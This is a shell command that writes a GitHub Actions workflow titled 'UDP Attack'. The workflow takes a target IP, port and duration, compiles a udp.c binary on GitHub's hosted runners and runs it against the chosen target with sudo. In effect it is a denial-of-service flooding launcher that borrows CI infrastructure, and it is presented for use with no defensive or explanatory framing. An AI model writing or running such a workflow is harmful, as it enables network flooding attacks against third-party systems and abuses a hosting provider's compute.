cat > .github/workflows/attack.yml << 'EOF'
name: UDP Attack

on:
  workflow_dispatch:
    inputs:
      target:
        description: 'Target IP'
        required: true
        default: '192.168.1.100'
      port:
        description: 'Target Port'
        required: true
        default: '80'
      time:
        description: 'Duration (seconds)'
        required: true
        default: '60'

jobs:
  attack:
    runs-on: ubuntu-latest
    steps:
      - name: Checkout
        uses: actions/checkout@v4
      
      - name: Compile UDP binary
        run: |
          gcc -O3 -std=gnu99 -Wall -pthread -o udp udp.c 2>&1
          chmod +x udp
      
      - name: Run UDP attack
        run: |
          sudo ./udp ${{ github.event.inputs.target }} ${{ github.event.inputs.port }} ${{ github.event.inputs.time }}
EOF
